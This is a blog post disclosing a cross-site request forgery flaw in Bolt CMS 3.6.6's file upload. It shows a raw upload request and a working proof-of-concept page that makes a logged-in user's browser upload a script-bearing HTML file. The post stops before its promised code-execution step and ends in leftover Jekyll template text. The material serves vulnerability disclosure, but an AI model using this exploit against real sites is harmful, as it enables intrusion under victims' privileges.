---
layout: post
---
A few days ago I started taking interest in Bolt, a content management that quoting from its github, is a "[Sophisticated, lightweight & simple CMS][bolt]".

The team behind it really did a great job in making the CMS easy to use, and packed with a lot of features. I truly recommend you checking out their project if you are looking for a cool new CMS to use.

<img src="images/2020-40-20-From-CSRF-to-RCE_01.png">

## Affected Version

Bolt CMS 3.6.6 - It is possible that lower versions are vulnerable as well.

## Explanation

It is common to find some vulnerabilities that alone don't actually create a good case, like CSRF and some types of XSS, so it's up to the attacker to make use of them and create creative ways to chain attacks.

In this post, I will be showing how it was possible to obtain Remote Code Execution through a Cross Site Request Forgery in Bolt CMS.

## Starting with CSRF

This flaw exists in the file upload section called "Files on the Stack", available for users that can manage content for the Homepage, Pages, Entries and Blocks.

You may think, CSRF on file upload? What can I do with this? Can I pwn the server sending PHP? No, BUT you can upload HTML files!

{% highlight text %}
POST /bolt/upload HTTP/1.1
Host: victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://victim.com/bolt/editcontent/homepage
X-Requested-With: XMLHttpRequest
Content-Length: 227
Content-Type: multipart/form-data; boundary=---------------------------6228775941835128519569528722
Connection: close
-----------------------------6228775941835128519569528722
Content-Disposition: form-data; name="files[]"; filename="test.html"
Content-Type: text/markdown

<html><script>alert("hi");</script></html>

-----------------------------6228775941835128519569528722--
{% endhighlight %}

This means that we, attackers, can execute arbitrary JavaScript in the same context as the application with the authenticated user privileges, which you will see how important it is for the attack.

A simple code to exploit CSRF and upload an HTML file is provided below (with the help of Burp Pro), it will upload a "test.html" file that can be located in a default path for every bolt installation: "/files/YEAR-MONTH" in my case: "victim.com/files/2019-04/test.html":

{% highlight html %}
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/127.0.0.1\/bolt\/upload", true);
        xhr.setRequestHeader("Accept", "application\/json, text\/javascript, *\/*; q=0.01");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------6228775941835128519569528722");
        xhr.withCredentials = true;
        var body = "-----------------------------6228775941835128519569528722\r\n" + 
          "Content-Disposition: form-data; name=\"files[]\"; filename=\"test.html\"\r\n" + 
          "Content-Type: text/markdown\r\n" + 
          "\r\n" + 
          "\x3chtml\x3e\x3cscript\x3ealert(\"hi\");\x3c/script\x3e\x3c/html\x3e\n" + 
          "\r\n" + 
          "-----------------------------6228775941835128519569528722--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
{% endhighlight %}


Check out the [Jekyll docs][jekyll-docs] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll Talk][jekyll-talk].

[bolt]: https://bolt.cm/
